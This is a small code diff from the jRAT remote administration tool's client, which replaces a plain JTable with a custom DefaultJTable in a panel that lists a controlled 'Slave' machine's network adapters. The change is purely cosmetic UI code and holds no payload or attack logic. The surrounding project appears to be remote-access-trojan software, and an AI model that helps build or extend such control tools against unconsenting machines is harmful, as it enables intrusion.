@@ -14,6 +14,7 @@ import javax.swing.table.DefaultTableModel;
 
 import se.jrat.client.Slave;
 import se.jrat.client.packets.outgoing.Packet82NetworkAdapters;
+import se.jrat.client.ui.components.DefaultJTable;
 import se.jrat.client.utils.IconUtils;
 
 
@@ -71,7 +72,7 @@ public class PanelControlAdapters extends PanelControlParent {
 					.addContainerGap(17, Short.MAX_VALUE))
 		);
 
-		table = new JTable();
+		table = new DefaultJTable();
 		table.setModel(model = new DefaultTableModel(new Object[][] {}, new String[] { "Display name", "Name", "InetAddresses" }));
 		table.setRowHeight(25);
 		table.getColumnModel().getColumn(0).setPreferredWidth(176);
